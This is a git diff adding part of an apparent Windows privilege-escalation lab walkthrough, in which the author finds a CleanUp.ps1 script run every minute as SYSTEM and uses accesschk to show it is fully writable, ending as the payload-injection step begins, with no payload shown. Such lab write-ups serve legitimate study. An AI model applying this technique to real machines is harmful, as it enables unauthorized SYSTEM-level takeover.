@@ -154,3 +154,57 @@ C:\DevTools> dir
 <p align="center">
   <img src="images/step2-1.png" width="600">
 </p>
+
+I found `CleanUp.ps1`. I opened it straight away:
+
+```bash
+C:\DevTools> type CleanUp.ps1
+```
+```
+# This script will clean up all your old dev logs every minute.
+# To avoid permissions issues, run as SYSTEM (should probably fix this later)
+
+Remove-Item C:\DevTools\*.log
+```
+The comment said everything I needed to know:
+
+- Runs every minute
+- Runs as SYSTEM
+- The developer even left a note saying they should fix the permissions later — they never did
+
+**This was my target.**
+
+<p align="center">
+  <img src="images/step2-2.png" width="600">
+</p>
+
+## Step 4 — Checking File Permissions on CleanUp.ps1
+
+```bash
+C:\PrivEsc> .\accesschk.exe /accepteula -uwqv user C:\DevTools\CleanUp.ps1
+```
+## Command Breakdown
+```
+|           Part           |                         Description                                                        |
+|--------------------------|--------------------------------------------------------------------------------------------|
+| C:\PrivEsc\accesschk.exe | Runs the **AccessChk** tool from the specified directory.                                  |
+|     /accepteula          | Automatically accepts the Sysinternals license agreement so it doesn't prompt on first run.|
+|         -u               | Suppresses errors (for example, "Access Denied") to keep the output clean.                 |
+|         -w               | Displays only objects that have **write permissions**.                                     |
+|         -q               | Quiet mode. Omits the banner and unnecessary output.                                       |
+|         -v               | Verbose mode. Shows detailed permission information.                                       |
+|         user             | Checks the permissions assigned to the **user** account.                                   |
+| C:\DevTools\CleanUp.ps1  | The target file whose permissions are being checked.                                       |
+```
+
+**Output:**
+
+```
+RW C:\DevTools\CleanUp.ps1
+        FILE_ALL_ACCESS
+```
+All permission was wide open. I could write whatever I wanted into CleanUp.ps1. Since the scheduled task runs this script every minute as SYSTEM, any command I add will run as SYSTEM automatically.
+
+## Step 5 — Injecting the Payload into CleanUp.ps1
+
+I appended my malicious payload to the end of the script using a simple echo command:
